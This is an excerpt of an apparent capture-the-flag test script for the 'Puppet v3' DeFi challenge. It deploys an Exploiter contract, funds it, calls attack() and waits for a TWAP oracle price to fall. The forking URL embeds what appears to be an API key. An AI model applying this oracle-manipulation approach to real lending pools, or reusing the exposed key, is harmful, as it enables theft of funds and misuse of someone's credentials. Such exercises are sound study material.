...
describe("[Challenge] Puppet v3", function () {
  ...
  const MAINNET_FORKING_URL =
    "https://eth-mainnet.g.alchemy.com/v2/GyfFTjIZGde9-H124t91696WWpNihI5O";
  ...
  it("Execution", async function () {
    ...
    const ExploiterFactory = await ethers.getContractFactory(
      "contracts/puppet-v3/Exploiter.sol:Exploiter",
      deployer
    );
    ...
    await token
      .connect(player)
      .transfer(exploiter.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await exploiter.connect(player).attack(PLAYER_INITIAL_TOKEN_BALANCE);

    // wait 100 seconds to let the twap decrease
